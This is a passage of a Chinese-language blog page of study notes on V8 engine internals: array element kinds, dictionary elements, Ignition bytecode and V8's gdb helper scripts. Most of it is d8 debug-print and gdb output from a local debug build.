class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow_natives_syntax test.js </span><br><span class="line">b</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map &#x3D; 0x236e9503b71 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x92dae107f51</span><br><span class="line"> - elements &#x3D; 0xf279b90c861 &lt;FixedArray[3]&gt; [FAST_ELEMENTS (COW)]</span><br><span class="line"> - length &#x3D; 3</span><br><span class="line"> - properties &#x3D; 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements &#x3D; 0xf279b90c861 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b408191 &lt;String[1]: b&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503b71: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x236e9503d29 &lt;Map(FAST_HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - transitions #1: 0x92dae108a81 &lt;TransitionArray[5]&gt;</span><br><span class="line">     0x31013b404069 &lt;Symbol: elements_transition_symbol&gt;: (transition to FAST_HOLEY_ELEMENTS) -&gt; 0x236e9503e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi &#x3D; 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map &#x3D; 0x236e9503e31 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x92dae107f51</span><br><span class="line"> - elements &#x3D; 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length &#x3D; 3</span><br><span class="line"> - properties &#x3D; 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements &#x3D; 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e9503e31: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x236e9503b71 &lt;Map(FAST_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x92dae108a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x92dae107f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi &#x3D; 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">undefined</span><br><span class="line">DebugPrint: 0xf279b90c8e9: [JSArray]</span><br><span class="line"> - map &#x3D; 0x236e950f779 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0xf279b90c9e9</span><br><span class="line"> - elements &#x3D; 0xf279b90c919 &lt;FixedArray[3]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - length &#x3D; 3</span><br><span class="line"> - properties &#x3D; 0x31013b402241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x37e7c51b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements &#x3D; 0xf279b90c919 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 0x31013b408171 &lt;String[1]: a&gt;</span><br><span class="line">           1: 0x31013b402351 &lt;the_hole&gt;</span><br><span class="line">           2: 0x31013b4081b1 &lt;String[1]: c&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x236e950f779: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x31013b402311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0xf279b90cad9 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0xf279b90c9e9 &lt;Object map &#x3D; 0x236e950f7d1&gt;</span><br><span class="line"> - constructor: 0x92dae107f71 &lt;JSFunction Array (sfi &#x3D; 0x31013b43d6c1)&gt;</span><br><span class="line"> - code cache: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x31013b402241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">a</span><br><span class="line">B</span><br><span class="line">c</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-082449.jpg" alt=""><br>  简言之，如果属性在接收者上找不到（接受者可以理解为要访问的属性或者方法指向的那个对象），那么就会继续到原型链上找。<br>这些元素是自给自足的，换言之，我们不需要在隐藏类上储存这些索引属性。另外，我们需要一个特殊的值，称之为空洞，来标记那些不存在属性。这点对于数组方法的性能很关键。<br>若是我们知道elements store没有空洞，是被填满的，我们可以提高本地操作（指无需原型链参与）的性能，不需要再去花费昂贵的代价查找原型链。</p><h3 id="Fast-or-Dictionary-Elements"><a href="#Fast-or-Dictionary-Elements" class="headerlink" title="Fast or Dictionary Elements"></a>Fast or Dictionary Elements</h3><p>  第二个关于元素的主要的区分为是否是快速或是字典模式。快速元素就是VM内部简单的将数组索引与elements store中的索引映射。<br>然而，这种简单表示，在那种有很大的空洞以及很少位置被占用的数组上是相当浪费的。在这种情况下，我们将转换成字典模式，这会减小内存但轻微的牺牲性能。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sparseArray = [];</span><br><span class="line">sparseArray[<span class="number">9999</span>] = <span class="string">"foo"</span>; <span class="comment">// Creates an array with dictionary elements.</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: &#x2F;home&#x2F;parallels&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow_natives_syntax test.js</span><br><span class="line">DebugPrint: 0x6ed6db8c769: [JSArray]</span><br><span class="line"> - map &#x3D; 0x16a58d0f779 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x37db83507f51</span><br><span class="line"> - elements &#x3D; 0x6ed6db8c799 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length &#x3D; 10000</span><br><span class="line"> - properties &#x3D; 0x38a1eb682241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3529df1b6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements &#x3D; 0x6ed6db8c799 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   9999: 0x37db8352faa9 &lt;String[3]: foo&gt; (data, dict_index: 0, attrs: [WEC])</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145330.png" alt=""><br>0x270F=9999</p><p>  在这个例子中，如果给这个数组分配完整的10k个空间将会造成极大浪费。而实际上V8是创建了一个key-value-descriptor的triplets。这个例子中的key是“9999”，value是“foo”，而descriptor是使用的默认值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> array = [];</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(array, <span class="number">0</span>, &#123;<span class="attr">value</span>: <span class="string">"fixed"</span>, <span class="attr">configurable</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">%DebugPrint(array)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r --allow_natives_syntax test.js </span><br><span class="line">Starting program: &#x2F;home&#x2F;parallels&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow_natives_syntax test.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libthread_db.so.1&quot;.</span><br><span class="line">[New Thread 0x7ffff43f1700 (LWP 18068)]</span><br><span class="line">DebugPrint: 0x28f5f190c759: [JSArray]</span><br><span class="line"> - map &#x3D; 0x1e39b868f881 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x61172b07f51</span><br><span class="line"> - elements &#x3D; 0x28f5f190c849 &lt;FixedArray[17]&gt; [DICTIONARY_ELEMENTS]</span><br><span class="line"> - length &#x3D; 1</span><br><span class="line"> - properties &#x3D; 0x3c90a5102241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a07bddb6b51 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements &#x3D; 0x28f5f190c849 &lt;FixedArray[17]&gt; &#123;</span><br><span class="line">   0: 0x3c90a5111569 &lt;String[5]: fixed&gt; (data, dict_index: 0, attrs: [___])</span><br><span class="line"> &#125;</span><br><span class="line">0x1e39b868f881: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 32</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: DICTIONARY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e39b8683e31 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #1: 0x61172b08a11 &lt;FixedArray[5]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x61172b07f51 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x61172b07f71 &lt;JSFunction Array (sfi &#x3D; 0x3c90a513d6c1)&gt;</span><br><span class="line"> - code cache: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x3c90a5102241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-084456.png" alt=""><br>  在上面例子中，我们给数组添加了一个non-configurable属性。这个信息就会被保存慢元素字典的triplet中的descriptor 部分。需要切记一点，数组方法在那些拥有慢元素的对象上的性能会相当慢。</p><h3 id="The-ElementsAccessor"><a href="#The-ElementsAccessor" class="headerlink" title="The ElementsAccessor"></a>The ElementsAccessor</h3><p>你可以想到开发人员根本不愿意为这20种元素在C++中对应重复写20遍数组方法。这里就是体现C++神奇的地方了。为了不实现数组方法一遍又一遍，我们建立了一个属性存取器（ElementsAccessor），在它里面大部分都仅仅是简单的属性访问相关的方法。这个属性访问其依赖C++中的CRTP来实现不同种类需求的数组方法。所以，有时如果我们调用例如数组的slice，V8会调用C++中的代码，然后通过属性存取器来选择所需函数，如slice的专门版本。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-090501.jpg" alt=""></p><h2 id="学习v8字节码"><a href="#学习v8字节码" class="headerlink" title="学习v8字节码"></a>学习v8字节码</h2><h3 id="阅读和打印（只是个例子）"><a href="#阅读和打印（只是个例子）" class="headerlink" title="阅读和打印（只是个例子）"></a>阅读和打印（只是个例子）</h3><p><code>./d8 --print-bytecode test.js</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function incrementX(obj) &#123;</span><br><span class="line">  return 1 + obj.x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">incrementX(&#123;x: 42&#125;);</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$ node --print-bytecode incrementX.js</span><br><span class="line">...</span><br><span class="line">[generating bytecode for function: incrementX]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 8</span><br><span class="line">  12 E&gt; 0x2ddf8802cf6e @    StackCheck</span><br><span class="line">  19 S&gt; 0x2ddf8802cf6f @    LdaSmi [1]</span><br><span class="line">        0x2ddf8802cf71 @    Star r0</span><br><span class="line">  34 E&gt; 0x2ddf8802cf73 @    LdaNamedProperty a0, [0], [4]</span><br><span class="line">  28 E&gt; 0x2ddf8802cf77 @    Add r0, [6]</span><br><span class="line">  36 S&gt; 0x2ddf8802cf7a @    Return</span><br><span class="line">Constant pool (size &#x3D; 1)</span><br><span class="line">0x2ddf8802cf21: [FixedArray] in OldSpace</span><br><span class="line"> - map &#x3D; 0x2ddfb2d02309 &lt;Map(HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br><span class="line">Handler Table (size &#x3D; 16)</span><br></pre></td></tr></table></figure><ul><li><p>LdaSmi [1]<br>LdaSmi [1]将常量 1 加载到累加器中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144516.jpg" alt=""></p></li><li><p>Star r0<br>接下来，Star r0 将当前在累加器中的值 1 存储在寄存器 r0 中。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145501.jpg" alt=""></p></li><li><p>LdaNamedProperty a0, [0], [4]<br>LdaNamedProperty 将 a0 的命名属性加载到累加器中。ai 指向 incrementX() 的第 i 个参数。在这个例子中，我们在 a0 上查找一个命名属性，这是 incrementX() 的第一个参数。该属性名由常量 0 确定。LdaNamedProperty 使用 0 在单独的表中查找名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- length: 1</span><br><span class="line">           0: 0x2ddf8db91611 &lt;String[1]: x&gt;</span><br></pre></td></tr></table></figure><p>可以看到，0 映射到了 x。因此这行字节码的意思是加载 obj.x。<br>那么值为 4 的操作数是干什么的呢？ 它是函数 incrementX() 的反馈向量的索引。反馈向量包含用于性能优化的 runtime 信息。<br>现在寄存器看起来是这样的：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145844.jpg" alt=""></p></li><li><p>Add r0, [6]<br>最后一条指令将 r0 加到累加器，结果是 43。 6 是反馈向量的另一个索引。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-145912.jpg" alt=""></p></li><li><p>Return<br>Return 返回累加器中的值。返回语句是函数 incrementX() 的结束。此时 incrementX() 的调用者可以在累加器中获得值 43，并可以进一步处理此值。</p></li></ul><p>乍一看，V8 的字节码看起来非常奇怪，特别是当我们打印出所有的额外信息。但是一旦你知道 Ignition 是一个带有累加器寄存器的寄存器，你就可以分析出大多数字节码都干了什么。</p><h3 id="bytecode如何产生"><a href="#bytecode如何产生" class="headerlink" title="bytecode如何产生"></a>bytecode如何产生</h3><ul><li>加法<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-150922.png" alt=""></li><li>访问对象<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-151626.png" alt=""><h3 id="编译bytecode"><a href="#编译bytecode" class="headerlink" title="编译bytecode"></a>编译bytecode</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-152050.png" alt=""></li></ul><h2 id="v8自带的gdb命令"><a href="#v8自带的gdb命令" class="headerlink" title="v8自带的gdb命令"></a>v8自带的gdb命令</h2><p>在/tools中可以找到gdbinit和gdb-v8-support.py<br>我将其都复制到调试路径下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ ls | grep gdb</span><br><span class="line">gdbinit</span><br><span class="line">gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>对如下代码进行测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a=[<span class="number">0xdeadbee</span>,<span class="number">0xdeadbeef</span>,<span class="string">"hoge"</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ source gdbinit</span><br><span class="line">gdb-peda$ source gdb-v8-support.py </span><br><span class="line">gdb-peda$ find 0xdeadbee</span><br><span class="line">Searching for &#39;0xdeadbee&#39; in: None ranges</span><br><span class="line">Found 1 results, display max 1 items:</span><br><span class="line">mapped : 0x5e88e28c6c4 --&gt; 0x7daafaa10deadbee </span><br><span class="line">   </span><br><span class="line">gdb-peda$ v8print 0x5e88e28c6c4-0x14+1</span><br><span class="line">0x5e88e28c6b1: [FixedArray]</span><br><span class="line"> - map &#x3D; 0x2702dbb82679 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - length: 3</span><br><span class="line">           0: 233495534</span><br><span class="line">           1: 0x318d7daafaa1 &lt;Number 3.73593e+09&gt;</span><br><span class="line">           2: 0x318d7daafa81 &lt;String[4]: hoge&gt;</span><br><span class="line">gdb-peda$ v8print *(void **)(0x5e88e28c6c4-0x14)</span><br><span class="line">0x2702dbb82679: [Map]</span><br><span class="line"> - type: FIXED_ARRAY_TYPE</span><br><span class="line"> - instance size: 0</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x504a7702311 &lt;undefined&gt;</span><br><span class="line"> - instance descriptors (own) #0: 0x504a7702231 &lt;FixedArray[0]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - constructor: 0x504a7702201 &lt;null&gt;</span><br><span class="line"> - code cache: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x504a7702241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure><h2 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h2><h3 id="print-flag"><a href="#print-flag" class="headerlink" title="print flag"></a>print flag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --help |grep print</span><br><span class="line">  --print_bytecode (print bytecode generated by ignition interpreter)</span><br><span class="line">  --print_bytecode_filter (filter for selecting which functions to print bytecode)</span><br><span class="line">  --hydrogen_stats (print statistics for hydrogen)</span><br><span class="line">  --print_deopt_stress (print number of possible deopt points)</span><br><span class="line">  --turbo_stats (print TurboFan statistics)</span><br><span class="line">  --turbo_stats_nvp (print TurboFan statistics in machine-readable format)</span><br><span class="line">  --print_wasm_code (Print WebAssembly code)</span><br><span class="line">  --trace_gc (print one trace line following each garbage collection)</span><br><span class="line">  --trace_gc_nvp (print one detailed trace line in name&#x3D;value format after each garbage collection)</span><br><span class="line">  --trace_gc_ignore_scavenger (do not print trace line after scavenger collection)</span><br><span class="line">  --trace_idle_notification (print one trace line following each idle notification)</span><br><span class="line">  --trace_idle_notification_verbose (prints the heap state used by the idle notification)</span><br><span class="line">  --trace_gc_verbose (print more details following each garbage collection)</span><br><span class="line">  --trace_allocation_stack_interval (print stack trace after &lt;n&gt; free-list allocations)</span><br><span class="line">  --trace_mutator_utilization (print mutator utilization, allocation speed, gc speed)</span><br><span class="line">  --trace_codegen (print name of functions for which code is generated)</span><br><span class="line">  --trace_serializer (print code serializer trace)</span><br><span class="line">  --external_reference_stats (print statistics on external references used during serialization)</span><br><span class="line">  --trace_side_effect_free_debug_evaluate (print debug messages for side-effect-free debug-evaluate for 